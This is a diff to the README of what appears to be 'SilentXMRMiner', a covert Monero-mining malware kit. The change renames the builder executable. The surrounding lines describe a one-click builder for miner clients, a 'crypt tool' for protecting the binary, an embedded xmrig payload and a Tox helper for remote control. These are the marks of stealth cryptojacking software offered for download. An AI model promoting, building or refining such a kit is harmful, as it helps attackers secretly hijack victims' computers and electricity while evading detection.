@@ -86,13 +86,13 @@ Protect the built binary with **bvm**:
 
 ## Download
 
-Grab `Bminer_SilentXMRMiner_v1.0.0_win64.zip` from [Releases](../../releases). Extract and run `Bminer.exe`.
+Grab `Bminer_SilentXMRMiner_v1.0.0_win64.zip` from [Releases](../../releases). Extract and run `bminer builder.exe`.
 
 Keep the DLL folders next to the exe (`platforms`, `imageformats`, `iconengines`, `styles`).
 
 | File | Role |
 |------|------|
-| `Bminer.exe` | Builder (build the miner client with one click) |
+| `bminer builder.exe` | Builder (build the miner client with one click) |
 | `bvm.exe` | Crypt tool |
 | `Client/resources/xmrig.exe` | CPU miner payload, embedded at build time |
 | `Client/tools/toxcli.exe` | Tox helper for Control |
